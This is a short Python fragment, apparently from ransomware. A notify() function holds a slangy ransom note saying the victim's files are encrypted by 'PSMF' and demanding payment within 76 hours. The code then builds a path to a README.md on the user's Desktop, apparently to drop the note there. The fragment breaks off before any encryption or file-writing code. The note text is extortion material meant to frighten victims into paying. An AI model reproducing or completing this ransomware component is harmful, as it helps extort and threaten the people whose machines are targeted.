import os

def notify():
    message = """What do lahd!!!

Your documents, photos, databases, and other important files have been encrypted, cuzzy. Your files are locked by PSMF using our powerful EMA encryption. A unique key has been generated to decrypt your files.

The private decryption key is stored on a secret server, and your files **cannot** be decrypted without it. You will only receive the private key **if** you make the payment to PSMF.

You have **76 hours** to submit the payment. If you do not send the money within the specified time, your data will be **permanently encrypted**, and nobody will be able to recover it. **Don't mess around, lad.**

"""

    # Get the desktop path dynamically
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    message_file = os.path.join(desktop, "README.md")
